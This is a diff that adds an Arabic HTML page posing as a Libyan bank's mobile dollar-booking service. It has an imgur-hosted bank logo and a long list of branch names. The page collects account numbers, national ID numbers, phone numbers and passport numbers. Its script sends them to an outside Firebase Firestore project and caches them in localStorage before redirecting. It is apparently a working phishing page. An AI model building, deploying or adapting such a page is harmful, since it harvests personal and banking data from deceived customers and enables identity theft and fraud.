@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>حجز دولار</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background-color: #121212;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* حاوية التطبيق لمحاكاة شاشة الهاتف */
+        .app-container {
+            width: 100%;
+            max-width: 420px;
+            min-height: 100vh;
+            background-color: #000000;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        /* القسم العلوي الأزرق */
+        .top-section {
+            background: linear-gradient(160deg, #2855cd 0%, #3247a3 100%);
+            padding: 60px 20px 80px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-bottom-left-radius: 15px;
+            border-bottom-right-radius: 15px;
+        }
+
+        /* الشعار (اللوجو) */
+        .logo-container {
+            margin-bottom: 40px; 
+        }
+        
+        .logo-container img {
+            width: 330px; 
+            height: auto;
+            display: block;
+        }
+
+        /* القسم السفلي المظلم */
+        .bottom-section {
+            padding: 40px 20px 30px 20px; 
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* صندوق النموذج (الخانات) */
+        .form-card {
+            background-color: #222222;
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 25px 20px;
+            margin-bottom: 25px;
+        }
+
+        /* تصميم خانات الإدخال والاختيار */
+        .input-group {
+            border: 1px solid #444;
+            border-radius: 8px;
+            background-color: #1a1a1a;
+            position: relative;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+        }
+
+        .input-group select,
+        .input-group input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            padding: 18px 0;
+            appearance: none;
+            outline: none;
+            text-align: right;
+        }
+
+        .input-group select {
+            cursor: pointer;
+        }
+
+        .input-group input::placeholder {
+            color: #888;
+        }
+
+        .input-group select option {
+            background-color: #222;
+            color: #fff;
+        }
+
+        /* أيقونة السهم داخل خانة الاختيار */
+        .select-icon {
+            position: absolute;
+            left: 15px;
+            pointer-events: none;
+        }
+        .select-icon svg {
+            width: 14px;
+            height: 14px;
+            fill: #888;
+        }
+
+        /* زر الاستمرار / تقديم الطلب */
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(90deg, #184bd6, #245ce8);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            margin-top: 25px;
+        }
+
+        .submit-btn:active {
+            opacity: 0.8;
+        }
+
+        .submit-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #fff;
+        }
+
+        /* الروابط السفلية */
+        .footer-links {
+            margin-top: auto;
+            margin-bottom: 20px;
+        }
+
+        .footer-row {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 20px;
+        }
+
+        .footer-link {
+            color: #888;
+            font-size: 13px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .footer-link svg {
+            width: 16px;
+            height: 16px;
+            fill: #888;
+        }
+
+        .subscribe-btn {
+            width: 100%;
+            background-color: transparent;
+            border: 1px solid #444;
+            color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="top-section">
+            <div class="logo-container">
+                <img src="https://i.imgur.com/UNIpHj3.png" id="bank-logo" alt="Bank Logo">
+            </div>
+        </div>
+
+        <div class="bottom-section">
+            <div class="form-card">
+                
+                <div class="input-group">
+                    <input type="number" id="account-number" placeholder="رقم الحساب" required>
+                </div>
+
+                <div class="input-group">
+                    <input type="number" id="national-id" placeholder="الرقم الوطني" required>
+                </div>
+
+                <div class="input-group">
+                    <input type="tel" id="phone-number" placeholder="رقم الهاتف" required>
+                </div>
+
+                <div class="input-group">
+                    <input type="text" id="passport-number" placeholder="رقم الجواز" required>
+                </div>
+
+                <div class="input-group">
+                    <select id="branch-select" required>
+                        <option value="" disabled selected>اختيار فرع الاستلام</option>
+                        <option value="الرئيسي طرابلس"> الرئيسي طرابلس</option>
+                        <option value="الاستقلال"> الاستقلال</option>
+                        <option value="البلدية"> البلدية</option>
+                        <option value="المغاربة"> المغاربة</option>
+                        <option value="سوق الثلاثاء"> سوق الثلاثاء</option>
+                        <option value="السواني"> السواني</option>
+                        <option value="الجادة"> الجادة</option>
+                        <option value="الرشيد"> الرشيد</option>
+                        <option value="الرئيسي بنغازي"> الرئيسي بنغازي</option>
+                        <option value="المختار"> المختار</option>
+                        <option value="الميدان"> الميدان</option>
+                        <option value="السوق"> السوق</option>
+                        <option value="الصابري">الصابري</option>
+                        <option value="الرويسات"> الرويسات</option>
+                        <option value="درنة"> درنة</option>
+                        <option value="اجدابيا"> اجدابيا</option>
+                        <option value="سرت">سرت</option>
+                        <option value="يفرن">يفرن</option>
+                        <option value="الأبيار">الأبيار</option>
+                        <option value="بن جواد">بن جواد</option>
+                        <option value="الزنتان">الزنتان</option>
+                        <option value="جالو">جالو</option>
+                        <option value="قصر الأخيار">قصر الأخيار</option>
+                        <option value="زليتن"> زليتن</option>
+                        <option value="أوجلة">أوجلة</option>
+                        <option value="أم الرزم">أم الرزم</option>
+                        <option value="مرتوبة">مرتوة</option>
+                        <option value="سيناون">سيناون</option>
+                        <option value="الساحل الشرقي">الساحل الشرقي</option>
+                        <option value="ميدان الجزائر">ميدان الجزائر</option>
+                        <option value="أبي عيسى">أبي عيسى</option>
+                        <option value="التميمي">التميمي</option>
+                        <option value="الزويتينة">الزويتينة</option>
+                        <option value="الريايينة">الريايينة</option>
+                        <option value="جردينة">جردينة</option>
+                        <option value="الأبرق">الأبرق</option>
+                        <option value="بئر الغنم">بئر الغنم</option>
+                        <option value="طرق المطار">طرق المطار</option>
+                        <option value="الخليج">الخليج</option>
+                        <option value="القرية السياحية">القرية السياحية</option>
+                        <option value="قرية ناصر">قرية ناصر</option>
+                        <option value="النهر الصناعي">النهر الصناعي</option>
+                        <option value="هراوة">هراوة</option>
+                        <option value="سبها">سبها</option>
+                        <option value="الحرابة">الحرابة</option>
+                        <option value="تيجي">تيجي</option>
+                        <option value="المرج">المرج</option>
+                        <option value="المعمورة">المعمورة</option>
+                        <option value="الجوش">الجوش</option>
+                        <option value="الخمس">5الخمس</option>
+                        <option value="الزاوية">الزاوية</option>
+                        <option value="جادو">جادو</option>
+                        <option value="دريانة">دريانة</option>
+                        <option value="تيبستي">تيبستي</option>
+                        <option value="شحات">شحات</option>
+                        <option value="طبرق">طبرق</option>
+                        <option value="الساحل الغربي">الساحل الغربي</option>
+                        <option value="وادي الهيرة">وادي الهيرة</option>
+                        <option value="مصراتة">مصراتة</option>
+                        <option value="المنارة">المنارة</option>
+                        <option value="الرابطة">الرابطة</option>
+                        <option value="حديقة الشعب">حديقة الشعب</option>
+                        <option value="العجيلات">العجيلات</option>
+                        <option value="البيضاء">البيضاء</option>
+                        <option value="غوط السلطان">غوط السلطان</option>
+                        <option value="مسلاتة">مسلاتة</option>
+                        <option value="جامعة سرت">جامعة سرت</option>
+                        <option value="جامع الصقع">جامع الصقع</option>
+                        <option value="برج طرابلس">برج طرابلس</option>
+                        <option value="سوق مواد البناء">سوق مواد البناء</option>
+                        <option value="الخدمات والمؤسسات والشركات – مصراتة">الخدمات والمؤسسات والشركات – مصراتة</option>
+                        <option value="رجال الأعمال">رجال الأعمال</option>
+                    </select>
+                    <div class="select-icon">
+                        <svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>
+                    </div>
+                </div>
+
+                <button id="submit-btn" class="submit-btn">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                    </svg>
+                    <span id="btn-text">تقديم الطلب</span>
+                </button>
+            </div>
+
+            <div class="footer-links">
+                <div class="footer-row">
+                    <a href="pdf.html" class="footer-link">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                        البحث عن صراف آلي
+                    </a>
+                    <a href="#" class="footer-link">
+                        <svg viewBox="0 0 24 24"><path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9-4.03-9-9-9zm0 16c-3.86 0-7-3.14-7-7s3.14-7 7-7 7 3.14 7 7-3.14 7-7-3.14 7-7 7zm1-11h-2v5l4.28 2.54.92-1.54-3.2-1.9V8z"/></svg>
+                        المظهر • نظام
+                    </a>
+                </div>
+                <button class="subscribe-btn">الاشتراك في التطبيق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- استدعاء مكتبات Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+
+    <script>
+        // إعدادات مشروع Firebase الخاص بك (استبدل القيم ببيانات مشروعك الحقيقية)
+        const firebaseConfig = {
+            apiKey: "AIzaSyDfJHyEUFzxp6qexJHJDwwh-WUX2aGjojY",
+            authDomain: "tasreef-dolar.firebaseapp.com",
+            projectId: "tasreef-dolar",
+            storageBucket: "tasreef-dolar.firebasestorage.app",
+            messagingSenderId: "579472040325",
+            appId: "1:579472040325:web:17ade35ff2a5bb2ae124ec"
+        };
+
+        // تهيئة Firebase و قاعدة البيانات Firestore
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // ربط عناصر الصفحة
+        const accountNumberInput = document.getElementById('account-number');
+        const nationalIdInput = document.getElementById('national-id');
+        const phoneNumberInput = document.getElementById('phone-number');
+        const passportNumberInput = document.getElementById('passport-number');
+        const branchSelect = document.getElementById('branch-select');
+        const submitBtn = document.getElementById('submit-btn');
+        const btnText = document.getElementById('btn-text');
+
+        // حدث الضغط على زر تقديم الطلب
+        submitBtn.addEventListener('click', async function(e) {
+            e.preventDefault(); // منع أي سلوك افتراضي للزر
+
+            // تجميع البيانات من الخانات
+            const formData = {
+                accountNumber: accountNumberInput.value,
+                nationalId: nationalIdInput.value,
+                phoneNumber: phoneNumberInput.value,
+                passportNumber: passportNumberInput.value,
+                branch: branchSelect.value,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            };
+
+            // التحقق من تعبئة جميع الحقول
+            if (!formData.accountNumber || !formData.nationalId || !formData.phoneNumber || !formData.passportNumber || !formData.branch) {
+                alert('يرجى تعبئة جميع الحقول المطلوبة قبل تقديم الطلب');
+                return;
+            }
+
+            // تعطيل الزر لمنع التكرار أثناء الإرسال وتغيير النص
+            submitBtn.disabled = true;
+            btnText.innerText = 'جاري الإرسال...';
+
+            try {
+                // حفظ البيانات في مجموعة (Collection) باسم "requests"
+                await db.collection("requests").add(formData);
+
+                // حفظ التخزين المحلي للاستفادة منها في صفحة pdf.html
+                localStorage.setItem('accountNumber', formData.accountNumber);
+                localStorage.setItem('nationalId', formData.nationalId);
+                localStorage.setItem('phoneNumber', formData.phoneNumber);
+                localStorage.setItem('passportNumber', formData.passportNumber);
+                localStorage.setItem('branch', formData.branch);
+
+                // التوجيه للصفحة التالية بعد نجاح الإرسال
+                window.location.href = 'pdf.html';
+            } catch (error) {
+                console.error("خطأ أثناء الإرسال: ", error);
+                alert("حدث خطأ أثناء إرسال البيانات، يرجى المحاولة لاحقاً.");
+                
+                // إعادة تفعيل الزر في حالة حدوث خطأ
+                submitBtn.disabled = false;
+                btnText.innerText = 'تقديم الطلب';
+            }
+        });
+    </script>
+</body>
+</html>
